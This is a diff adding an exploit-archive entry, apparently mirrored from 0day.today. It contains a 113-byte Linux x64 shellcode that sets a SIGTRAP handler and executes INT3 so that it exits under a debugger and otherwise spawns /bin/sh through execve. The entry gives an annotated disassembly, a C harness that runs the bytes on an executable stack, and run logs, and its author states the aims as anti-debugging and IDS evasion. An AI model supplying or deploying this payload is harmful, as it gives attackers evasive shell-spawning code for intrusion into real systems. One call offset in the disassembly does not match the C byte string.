@@ -1,0 +1,162 @@
+id: 34385
+date: 05/07/2020
+title: Linux/x64 Anti-Debug Trick INT3 Trap Shellcode (113 bytes)
+author: Dario Castrogiovanni
+cves: 
+
+/*
+###########################################################################################################
+# Shellcode Title: [linux/x64] anti-debug trick (INT3 trap) + execve("/bin/sh") - NULL Free - (113 bytes) #
+# Shellcode Author: Dario Castrogiovanni                                                                  #
+# Tested on: LXLE Linux 18.04 x64                                                                         #
+###########################################################################################################
+# Description:
+This shellcode is inspired by "(linux/x86) anti-debug trick (INT 3h trap) + execve("/bin/sh", ["/bin/sh", NULL], NULL)" written by izik.
+
+I have rewritten the shellcode for Linux x64, in which the exceptions are managed by the syscall sys_rt_sigaction.
+The sigaction syscall needs two data structures of type sigaction.
+
+The reason behind my shellcode is that I like the izik original idea to protect the shellcode from being run inside a debugger (anti-debugging technique) or to try to mislead an IDS (IDS evasion technique).
+
+If executed inside a debugger the shellcode breaks when the INT3 is encountered since the debugger handles the exception, continuing the execution the shellcode invokes a sys_exit.
+On normal execution the shellcode open a /bin/sh shell using execve.
+
+Dario Castrogiovanni (bdev - https://reversingforfun.info)
+
+###################################################################################
+
+Compiling the POC code with -z execstack allows the shellcode run from Stack.
+
+bdev@x-sys:~/shellcode$ gcc -z execstack -fPIE -o lin-x64-sigtrap-shellcode.elf lin-x64-sigtrap-shellcode-113b.c 
+bdev@x-sys:~/shellcode$ ./lin-x64-sigtrap-shellcode.elf 
+Shellcode length: 113 byte
+Shellcode memory position: 0x7ffcfad23d90
+
+$ 
+bdev@x-sys:~/shellcode$ ./lin-x64-sigtrap-shellcode.elf 
+Shellcode length: 113 byte
+Shellcode memory position: 0x7ffd5bd9eea0
+
+$ 
+bdev@x-sys:~/shellcode$ gdb -quiet lin-x64-sigtrap-shellcode.elf 
+Reading symbols from lin-x64-sigtrap-shellcode.elf...(no debugging symbols found)...done.
+(gdb) run
+Starting program: /home/bdev/shellcode/lin-x64-sigtrap-shellcode.elf 
+Shellcode length: 113 byte
+Shellcode memory position: 0x7fffffffe970
+
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x00007fffffffe989 in ?? ()
+(gdb) continue
+Continuing.
+[Inferior 1 (process 9963) exited normally]
+(gdb) quit
+
+###################################################################################
+
+
+
+------------- [Syscall: sigaction] ------------------------------------------------
+|%rax     -> System call number
+| 0xd     =  sys_rt_sigaction
+------------- [Parameters] --------------------------------------------------------
+|%rdi     |%rsi                         |%rdx                   |%r10
+|int sig  |const struct sigaction *act  |struct sigaction *oact |size_t sigsetsize
+-----------------------------------------------------------------------------------
+
+------------- [Syscall: execve] ---------------------------------------------------
+|%rax     -> System call number
+| 0x3b    =  sys_execve
+------------- [Parameters] --------------------------------------------------------
+|%rdi                  |%rsi                      |%rdx
+|const char *filename  |const char *const argv[]  |const char *const envp[]
+-----------------------------------------------------------------------------------
+
+ <start>:
+  eb 63                  jmp    <SStart>
+ <evilSignal>:
+  48 89 e6               mov    %rsp,%rsi  ; (sys_rt_sigaction) sigaction *act  
+  6a 0d                  pushq  $0xd
+  59                     pop    %rcx
+ <Zero_OAct_Struct>:
+  6a 01                  pushq  $0x1
+  fe 0c 24               decb   (%rsp)
+  e2 f9                  loop   <Zero_OAct_Struct>
+  80 c9 0d               or     $0xd,%cl
+  54                     push   %rsp
+  48 89 e2               mov    %rsp,%rdx  ; (sys_rt_sigaction) sigaction *oact  
+ <invokesyscall>:
+  0f 05                  syscall 
+  cc                     int3   
+  48 31 c0               xor    %rax,%rax
+  48 89 c7               mov    %rax,%rdi
+  b0 3c                  mov    $0x3c,%al  ; <- sys_exit syscall number <- 0x3c
+  eb f3                  jmp    <invokesyscall>
+
+ <evilSignal-StructPrepare>:
+  6a 0d                  pushq  $0xd
+  59                     pop    %rcx
+  4d 31 c9               xor    %r9,%r9
+ <Zero_Act_Struct>:
+  41 51                  push   %r9
+  e2 fc                  loop   <Zero_Act_Struct>
+  49 89 e1               mov    %rsp,%r9
+  49 83 c1 03            add    $0x3,%r9
+  41 80 09 14            orb    $0x14,(%r9)
+  49 83 c1 0d            add    $0xd,%r9
+  66 41 83 09 ff         orw    $0xffff,(%r9)
+  e8 b5 ff ff ff         callq  <evilSignal>
+  99                     cltd   
+  48 31 c0               xor    %rax,%rax
+  b0 3b                  mov    $0x3b,%al ; sys_execve <- 0x3b
+  52                     push   %rdx
+  48 bf 2f 62 69 6e 2f   movabs $0x68732f2f6e69622f,%rdi ; <- file name = /bin//sh 
+  2f 73 68 
+  57                     push   %rdi
+  54                     push   %rsp
+  5f                     pop    %rdi
+  4d 31 c9               xor    %r9,%r9
+  4c 89 ce               mov    %r9,%rsi    ; <- (execve) argv = NULL
+  48 89 f2               mov    %rsi,%rdx   ; <- (execve) argp = NULL
+  eb b1                  jmp    <invokesyscall>
+ <SStart>:
+  6a 0d                  pushq  $0xd
+  58                     pop    %rax  ; sys_rt_sigaction syscall number <- 0xd 
+  6a 05                  pushq  $0x5
+  5f                     pop    %rdi  ; SIGTRAP <- 0x5
+  6a 08                  pushq  $0x8
+  41 5a                  pop    %r10  ; sigsetsize <- 8
+  eb b2                  jmp    <evilSignal-StructPrepare>
+*/
+
+#include <stdio.h>
+#include <string.h>
+
+int main ()
+{
+  char shellcode[] = "\xeb\x63\x48\x89\xe6\x6a\x0d\x59"\
+                           "\x6a\x01\xfe\x0c\x24\xe2\xf9\x80"\
+                           "\xc9\x0d\x54\x48\x89\xe2\x0f\x05"\
+                           "\xcc\x48\x31\xc0\x48\x89\xc7\xb0"\
+                           "\x3c\xeb\xf3\x6a\x0d\x59\x4d\x31"\
+                           "\xc9\x41\x51\xe2\xfc\x49\x89\xe1"\
+                           "\x49\x83\xc1\x03\x41\x80\x09\x14"\
+                           "\x49\x83\xc1\x0d\x66\x41\x83\x09"\
+                           "\xff\xe8\xbc\xff\xff\xff\x99\x48"\
+                           "\x31\xc0\xb0\x3b\x52\x48\xbf\x2f"\
+                           "\x62\x69\x6e\x2f\x2f\x73\x68\x57"\
+                           "\x54\x5f\x4d\x31\xc9\x4c\x89\xce"\
+                           "\x48\x89\xf2\xeb\xb1\x6a\x0d\x58"\
+                           "\x6a\x05\x5f\x6a\x08\x41\x5a\xeb"\
+                           "\xb2";
+
+  printf("Shellcode length: %ld byte\nShellcode memory position: %p\n\n", strlen(shellcode), shellcode);
+  
+  int (*shellcodec)() = (int (*)())shellcode;
+  shellcodec();
+
+  return 0;
+}
+
+#  0day.today [2023-03-22]  #
